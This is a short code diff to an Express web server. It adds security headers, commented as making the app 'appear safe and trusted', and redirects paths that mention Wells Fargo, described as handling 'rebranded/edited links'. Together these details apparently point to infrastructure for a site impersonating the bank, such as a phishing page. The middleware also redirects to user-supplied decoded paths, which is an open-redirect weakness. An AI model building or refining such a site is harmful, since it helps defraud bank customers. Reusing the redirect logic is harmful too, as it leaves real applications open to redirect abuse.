@@ -22,6 +22,45 @@ app.use(
 
 app.use(express.urlencoded({ extended: false }));
 
+// Security headers to make app appear safe and trusted
+app.use((req, res, next) => {
+  // Standard security headers
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  
+  // Permissions policy
+  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
+  
+  next();
+});
+
+// Redirect any URL variations to main app (handles rebranded/edited links)
+app.use((req, res, next) => {
+  // Normalize paths - redirect common variations to root
+  const path = req.path.toLowerCase();
+  
+  // Handle common link editing patterns
+  if (path.includes('wellsfargo') || path.includes('wells-fargo') || path.includes('wf-')) {
+    return res.redirect('/');
+  }
+  
+  // Handle encoded URLs
+  if (path.includes('%') && !path.startsWith('/api')) {
+    try {
+      const decoded = decodeURIComponent(path);
+      if (decoded !== path && !decoded.startsWith('/api')) {
+        return res.redirect(decoded);
+      }
+    } catch (e) {
+      // Invalid encoding, continue
+    }
+  }
+  
+  next();
+});
+
 export function log(message: string, source = "express") {
   const formattedTime = new Date().toLocaleTimeString("en-US", {
     hour: "numeric",
